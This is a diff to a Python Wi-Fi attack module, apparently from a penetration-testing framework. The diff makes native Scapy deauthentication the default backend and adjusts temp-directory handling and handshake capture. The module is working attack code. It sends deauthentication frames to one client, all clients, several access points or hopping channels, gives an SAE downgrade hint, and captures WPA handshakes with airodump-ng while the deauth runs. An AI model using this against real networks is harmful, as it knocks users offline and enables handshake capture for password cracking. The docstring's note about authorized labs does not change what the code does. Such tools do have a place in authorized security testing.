@@ -3,21 +3,25 @@
 """Multi-mode deauthentication attack module.
 
 Supports multiple deauth strategies in a single module:
-  - targeted     Single client from specific AP (aireplay-ng style)
+  - targeted     Single client from specific AP
   - broadcast    All clients of a specific AP
   - multi_ap     Multiple APs simultaneously
   - channel_hop  Deauth across channels (mdk4 style)
   - pmf_aware    PMF/802.11w detection + SAE downgrade hint
 
+Backends (controlled via ``backend`` option):
+  - native (default)  Scapy Dot11Deauth frames - no external tools required
+  - aireplay          aireplay-ng (aircrack-ng suite)
+  - mdk4              mdk4 deauth mode
+
 All operations require an authorized lab environment with monitor-mode interface.
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
 
 import logging
-import os
 import shutil
 import subprocess
 import time
@@ -57,7 +61,7 @@ class Exploit(Exploit):
         "targeted",
         "Attack mode: targeted | broadcast | multi_ap | channel_hop | pmf_aware",
     )
-    backend = OptString("aireplay", "Backend tool: aireplay | mdk4 | scapy")
+    backend = OptString("native", "Backend tool: native (Scapy) | aireplay | mdk4")
     count = OptInteger(0, "Number of deauth frames (0 = continuous)")
     delay = OptInteger(0, "Delay between bursts in ms")
     channel = OptString("", "Channel(s) — comma-separated for multi/hop modes")
@@ -66,7 +70,7 @@ class Exploit(Exploit):
     dry_run = OptBool(False, "Print command without executing")
 
     VALID_MODES = ("targeted", "broadcast", "multi_ap", "channel_hop", "pmf_aware")
-    VALID_BACKENDS = ("aireplay", "mdk4", "scapy")
+    VALID_BACKENDS = ("native", "aireplay", "mdk4", "scapy")
 
     def _check_pmf(self) -> bool:
         """Check if target AP advertises PMF (802.11w) via beacon analysis."""
@@ -99,14 +103,18 @@ class Exploit(Exploit):
                 pass
 
     def _scan_clients(self) -> List[str]:
-        """Faz airodump rápido (5s) para detectar clientes conectados ao AP.
-        Retorna lista de MACs de clientes."""
+        """Run a quick airodump-ng scan (5s) to detect clients connected to the target AP.
+
+        Returns:
+            List of client MAC address strings associated with the target BSSID.
+        """
         if not shutil.which("airodump-ng"):
             return []
-        import tempfile
-        import csv
-        with tempfile.TemporaryDirectory() as tmpdir:
-            out_prefix = f"{tmpdir}/scan"
+
+        scan_tmp = Path(".tmp") / "wxf_scan_{:x}".format(int(time.time() * 1000))
+        scan_tmp.mkdir(parents=True, exist_ok=True)
+        try:
+            out_prefix = str(scan_tmp / "scan")
             cmd = [
                 "sudo", "airodump-ng",
                 "--bssid", self.target_bssid,
@@ -124,7 +132,7 @@ class Exploit(Exploit):
                 pass
             except Exception:
                 return []
-            csv_file = f"{out_prefix}-01.csv"
+            csv_file = out_prefix + "-01.csv"
             clients: List[str] = []
             try:
                 with open(csv_file, encoding="latin-1", errors="ignore") as f:
@@ -139,6 +147,8 @@ class Exploit(Exploit):
                                 clients.append(parts[0])
             except Exception:
                 pass
+        finally:
+            shutil.rmtree(str(scan_tmp), ignore_errors=True)
         return clients
 
     def _build_aireplay_cmd(self) -> List[str]:
@@ -166,9 +176,12 @@ class Exploit(Exploit):
     def _run_targeted_deauth_with_capture(self) -> None:
         """Deauth targetado por cliente + airodump simultâneo para captura de handshake."""
         import threading
-        import tempfile
 
-        out_dir = tempfile.mkdtemp(prefix="wxf_deauth_")
+        _tmp_base = Path(".tmp")
+        _tmp_base.mkdir(parents=True, exist_ok=True)
+        out_dir_path = _tmp_base / "wxf_deauth_{:x}".format(int(time.time() * 1000))
+        out_dir_path.mkdir(parents=True, exist_ok=True)
+        out_dir = str(out_dir_path)
         clients = self._scan_clients()
 
         if not clients:
@@ -201,7 +214,10 @@ class Exploit(Exploit):
 
         while time.time() < end_time:
             for client in deauth_targets:
-                if self.backend == "mdk4" and shutil.which("mdk4"):
+                if str(self.backend) in ("native", "scapy"):
+                    self._run_scapy_deauth()
+                    break
+                elif self.backend == "mdk4" and shutil.which("mdk4"):
                     cmd = ["sudo", "mdk4", self.interface, "d",
                            "-B", self.target_bssid]
                     if client != "FF:FF:FF:FF:FF:FF":
@@ -333,11 +349,15 @@ class Exploit(Exploit):
             self.mode = "broadcast"
 
         if bool(self.dry_run):
-            if self.backend == "aireplay":
+            _be = str(self.backend)
+            if _be in ("native", "scapy"):
+                print_info("DRY RUN: Scapy Dot11Deauth (native backend)")
+            elif _be == "aireplay":
                 cmd = self._build_aireplay_cmd()
+                print_info("DRY RUN: {}".format(" ".join(cmd)))
             else:
                 cmd = self._build_mdk4_cmd()
-            print_info("DRY RUN: {}".format(" ".join(cmd)))
+                print_info("DRY RUN: {}".format(" ".join(cmd)))
             return
 
         # Ajustar canal antes do ataque
@@ -352,13 +372,16 @@ class Exploit(Exploit):
         # Selecionar backend com fallback automático
         backend = str(self.backend)
 
-        # Priorizar mdk4 (mais confiável que aireplay em WSL)
+        # Normalize "native" to internal "scapy" label
+        if backend == "native":
+            backend = "scapy"
+
         if backend == "aireplay" and not shutil.which("aireplay-ng"):
             if shutil.which("mdk4"):
                 print_info("aireplay-ng não encontrado. Usando mdk4.")
                 backend = "mdk4"
             else:
-                print_info("Nenhum backend externo. Usando Scapy.")
+                print_info("Nenhum backend externo. Usando Scapy nativo.")
                 backend = "scapy"
 
         if backend == "scapy":
